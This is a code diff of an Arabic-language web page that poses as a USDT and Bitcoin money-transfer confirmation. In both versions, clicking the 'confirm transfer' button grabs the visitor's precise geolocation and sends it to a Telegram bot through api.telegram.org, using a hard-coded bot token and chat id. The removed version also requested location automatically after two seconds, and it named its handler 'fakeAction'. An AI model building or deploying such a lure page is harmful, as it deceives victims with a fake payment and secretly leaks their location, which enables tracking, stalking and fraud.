@@ -1,101 +1,75 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>عملات رقمية USDT وبيتكوين</title>
   <style>
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #000;
+      background-color: #111;
       color: #fff;
+      font-family: Arial, sans-serif;
       text-align: center;
-      background-image: url('https://i.ibb.co/qCjXH1G/bitcoin-bg.jpg');
-      background-size: cover;
-      background-position: center;
+      padding: 30px;
     }
-
-    .container {
-      margin-top: 100px;
-      background-color: rgba(0, 0, 0, 0.75);
-      display: inline-block;
-      padding: 40px;
-      border-radius: 20px;
-      box-shadow: 0 0 10px gold;
+    img {
+      width: 120px;
+      margin-top: 20px;
     }
-
-    img.logo {
-      width: 100px;
-      margin-bottom: 20px;
-    }
-
     h1 {
+      font-size: 26px;
+      margin-bottom: 10px;
       color: gold;
-      font-size: 24px;
     }
-
+    p {
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
     button {
+      font-size: 18px;
       background-color: gold;
-      color: black;
-      font-weight: bold;
-      padding: 15px 30px;
       border: none;
-      border-radius: 10px;
+      padding: 12px 25px;
+      border-radius: 8px;
+      color: black;
       cursor: pointer;
-      font-size: 16px;
-      margin-top: 30px;
-    }
-
-    button:hover {
-      background-color: #f0c000;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://i.ibb.co/w07T9rh/bitcoin-logo.png" alt="Bitcoin Logo" class="logo">
-    <h1>تهانينا! لقد تم قبول الطلب لتحويل المال</h1>
-    <button onclick="fakeAction()">تأكيد التحويل</button>
-  </div>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Logo">
+  <h1>عملات رقمية USDT وبيتكوين</h1>
+  <p>تهانينا، تم قبول الطلب لتحويل المال</p>
+  <button onclick="getLocation()">تأكيد التحويل</button>
 
   <script>
-    function sendLocation(lat, lon) {
-      const chat_id = "7485197107";
-      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-      const message = `📍 موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon}`;
-      fetch(url, {
-        method: "POST",
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id, text: message })
-      });
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      }
     }
 
-    function fakeAction() {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          sendLocation(lat, lon);
-        },
-        err => console.log("Location error:", err),
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
+    function sendToTelegram(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";  // تأكد أنه صحيح
+      const chat_id = "7485197107";  // تأكد أنه صحيح
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=📍 موقع جديد:\nLatitude: ${lat}\nLongitude: ${lon}`;
+
+      fetch(url)
+        .then(response => console.log('تم الإرسال للبوت'))
+        .catch(error => console.error('فشل الإرسال:', error));
     }
 
-    // طلب الموقع بخفة بعد 2 ثانية
-    setTimeout(() => {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
-          sendLocation(lat, lon);
-        },
-        err => {},
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    }, 2000);
+    function showError(error) {
+      console.error('فشل تحديد الموقع:', error);
+    }
   </script>
 </body>
 </html>
